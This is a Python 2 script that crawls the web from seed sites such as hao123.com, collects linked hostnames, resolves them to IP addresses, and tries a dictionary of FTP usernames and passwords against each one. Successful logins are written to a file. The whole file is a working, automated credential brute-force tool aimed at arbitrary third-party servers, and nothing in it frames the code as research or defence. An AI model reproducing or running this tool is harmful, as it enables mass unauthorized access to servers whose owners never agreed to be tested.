#!/usr/bin/env python
import ftplib
import re
import socket
import urllib2
import gevent
from gevent import monkey
from gevent import queue
monkey.patch_all()


passwdFile = 'userpass.txt'
hosts = queue.Queue()
hostpool=queue.Queue()
hostset=set()
hostpool.put("http://www.qkankan.com/")
hostset.add("http://www.qkankan.com/")
hostpool.put("http://www.hao123.com/")
hostset.add("http://www.hao123.com/")
def bruteLogin(dic):
    while True:
        if hosts.empty():
            #print 'hosts empty'
            gevent.sleep(0)
            continue
        hostname=hosts.get()
        print hostname
        
        for userName in dic.keys():
            passWord=dic[userName]
            print "[+] Trying: "+userName+"/"+passWord
            try:
                with gevent.Timeout(3, False) as timeout:
                    ftp = ftplib.FTP(hostname)
                    ftp.login(userName, passWord)
                    print '\n[*] ' + str(hostname) +' FTP Logon Succeeded: '+userName+"/"+passWord
                    succ=open('succ.txt','a')
                    succ.write('\n[*] ' + str(hostname) +' FTP Logon Succeeded: '+userName+"/"+passWord)
                    succ.close()
                    ftp.quit()
            except Exception, e:
                pass
            print 'login {0} wrong.'.format(hostname)

        
def scanhost():
    while True:
        if hostpool.empty():
            print 'no host'
        host=hostpool.get()
        #connect to a URL
        print host
        try:
            with gevent.Timeout(10, False) as timeout:
                website = urllib2.urlopen(host)
                #read html code
                html = website.read()
                #use re.findall to get all the links
                links = re.findall('"((http|ftp)?://(.*?\.(net|com|cn|org|cc|tv|tk|me|edu|uk|info|nl|cf|ga|ly|hk|us|xyz|aisa|top|gq|ml|jp))[/\' \"].*?)"', html,re.I)

                for link in links:
                    if link[2] not in hostset:
                        try: 
                            ip = socket.gethostbyname(link[2]) 
                            hosts.put(ip)
                            hostset.add(link[2])
                            hostpool.put(link[0])
                        except Exception,e:
                            print 'gethost:'+link[2]+str(e)

        except Exception,e:
            print 'urlopen:'+host+str(e)



pF = open(passwdFile, 'r')
dic={}
for line in pF.readlines():
    userName=line.split(':')[0]
    passWord=line.split(':')[1].strip('\r').strip('\n')
    dic[userName]=passWord
bure=gevent.spawn(bruteLogin,dic)
scan=gevent.spawn(scanhost)
gevent.joinall((scan,bure))
